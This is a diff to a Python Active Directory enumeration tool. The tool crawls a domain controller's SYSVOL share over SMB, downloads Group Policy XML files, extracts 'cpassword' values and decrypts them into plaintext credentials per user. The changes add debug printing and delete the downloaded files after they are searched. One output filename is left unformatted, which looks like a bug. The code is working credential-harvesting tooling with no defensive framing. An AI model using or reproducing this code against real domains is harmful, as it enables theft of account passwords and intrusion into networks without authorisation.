@@ -268,12 +268,15 @@ class EnumAD():
                 if str(share['shi1_netname']).rstrip('\0').lower() == 'sysvol':
                     path = smbconn.listPath(str(share['shi1_netname']).rstrip('\0'), '*')
                     paths = [e.get_shortname() for e in path if len(e.get_shortname()) > 2]
+                    print(paths)
                     for dirname in paths:
+                        print(dirname)
                         try:
                             # Dont want . or ..
                             subPath = smbconn.listPath(str(share['shi1_netname']).rstrip('\0'), str(dirname) + '\\*')
                             for sub in subPath:
                                 if len(sub.get_shortname()) > 2:
+                                    print(dirname + '\\' + sub.get_shortname())
                                     paths.append(dirname + '\\' + sub.get_shortname())
                         except (SessionError, UnicodeEncodeError, NetBIOSError) as e:
                             continue
@@ -288,9 +291,9 @@ class EnumAD():
                     # Since the first entry is the DC we dont want that
                     for item in paths[1:]:
                         if '.xml' in item.split('\\')[-1]:
-                            with open('file-content-{0}-{1}.log'.format(item.split('\\')[-2], item.split('\\')[-1]), 'wb') as f:
+                            with open('{0}-{1}'.format(item.split('\\')[-2], item.split('\\')[-1]), 'wb') as f:
                                 smbconn.getFile(str(share['shi1_netname']).rstrip('\0'), item, f.write)             
-                            with open('file-content-{0}-{1}.log'.format(item.split('\\')[-2], item.split('\\')[-1]), 'r') as f:
+                            with open('{0}-{1}'.format(item.split('\\')[-2], item.split('\\')[-1]), 'r') as f:
                                 try:
                                     passwdMatch = cpassRE.findall(f.read())
                                     for passwd in passwdMatch:
@@ -300,6 +303,9 @@ class EnumAD():
                                             cpasswords[usr] = cipher.decrypt(base64.b64decode(bytes(passwd + padding, 'utf-8'))).strip()
                                 except (UnicodeDecodeError, AttributeError) as e:
                                     continue
+
+                            # Remove the files we had to write during the search
+                            os.unlink('{0}-{1}'.format(item.split('\\')[-2], item.split('\\')[-1]))
 
             if len(cpasswords.keys()) > 0:
                 with open('{0}-cpasswords.json', 'w') as f:
